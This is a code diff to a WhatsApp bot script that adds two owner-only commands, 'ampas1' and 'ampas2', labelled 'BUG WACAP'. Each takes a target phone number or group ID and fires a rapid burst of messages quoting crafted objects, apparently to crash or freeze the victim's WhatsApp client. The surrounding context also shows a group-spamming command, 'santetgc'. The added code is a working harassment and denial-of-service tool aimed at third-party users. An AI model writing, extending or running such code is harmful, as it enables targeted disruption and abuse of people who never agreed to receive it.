@@ -658,6 +658,54 @@ let buttons = [
                           hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                       
                       break
+
+/*BUG WACAP */
+case 'ampas1' : {
+if (!isCreator) return
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await hisoka.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+}
+break
+//=================================================//
+/*BUG WACAP */
+case 'ampas2' : {
+if (!isCreator) return
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await hisoka.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: mek})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(20)
+hisoka.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
+await sleep(10000)
+}
+break
                       case 'santetgc': {
 
 if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
